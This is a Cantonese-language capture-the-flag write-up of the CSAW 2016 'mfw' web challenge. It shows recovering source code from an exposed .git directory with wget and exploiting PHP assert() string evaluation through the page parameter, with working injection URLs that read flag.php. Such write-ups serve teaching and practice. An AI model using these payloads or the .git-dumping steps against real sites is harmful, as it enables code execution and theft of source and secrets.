# CSAW CTF 2016 Quals: mfw

分類：Web 分數：125

Target: http://web.chal.csaw.io:8000/

## Exploration
入到去求其撳個 About 去到呢頁:
```
http://web.chal.csaw.io:8000/?page=about
```
然後佢話佢用 Git, PHP 同 Bootstrap 整個網喎

見到 PHP 同埋 page=乜乜乜 就條件反射試 PHP filter:
```
http://web.chal.csaw.io:8000/?page=php://filter/read=convert.base64-encode/resource=about
```
結果冇料到
之後求其試下個單引號睇下係唔係D 低能 SQLi 
```
http://web.chal.csaw.io:8000/?page='
```
結果竟然係 500 Server Error

## View Source
佢之前咪話自己用 Git, 信住先啦. 咁梗係試下 /.git/ :
```
http://web.chal.csaw.io:8000/.git/
```
有料到喎. 之後可以撳入去 objects 到將D files gzip decompress 返
唔鍾意人手玩既可以直接一野隊落黎再起返D missing files (即係 source code):
```
wget --mirror -I .git http://web.chal.csaw.io:8000/.git/ 
git checkout -- .
```
嗱 template 入面有個 flag.php, 不過一睇就知唔方好野:
```
<?php
// TODO
//$FLAG = '';
?>
```
混吉。
睇返 index.php 啦, 個 include file path 係
```
$file = "templates/" . $page . ".php";
```
所以你招 filter 冇用啦. 然後佢下面有兩句奇怪 assert statements check 你個 input 有冇D 蠱惑野
```
// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
```
但係好不幸地 PHP 會將 assert statement 入面既 string evaluate, 搞到好似 run 緊 eval 咁
所以點解頭先打個單引號會出 500, 因為 run 爛 code

## Exploitation
依家首先要砌到個 input 令到果兩句 assert statements 唔爛之餘又可以攝D code 入去 run 下:
```
http://web.chal.csaw.io:8000/?page=~(^o^)~

strpos('templates/~(^o^)~.php', '..') === false
file_exists('templates/~(^o^)~.php') 
```
最簡單就用 string concatenation:
```
http://web.chal.csaw.io:8000/?page=d'.strval(print(6*9)).'b

strpos('templates/d'.strval(print(6*9)).'b.php', '..') === false
file_exists('templates/d'.strval(print(6*9)).'b.php') 
```
咁樣段code 就冇爛, 重會 print 兩次 54
之後用個 highlight_file 讀 flag.php 個 source code:
```
http://web.chal.csaw.io:8000/?page=d'.strval(highlight_file('templates/flag.php')).'b
```
就會見到個 Flag 出現兩次
```
<?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?>
```
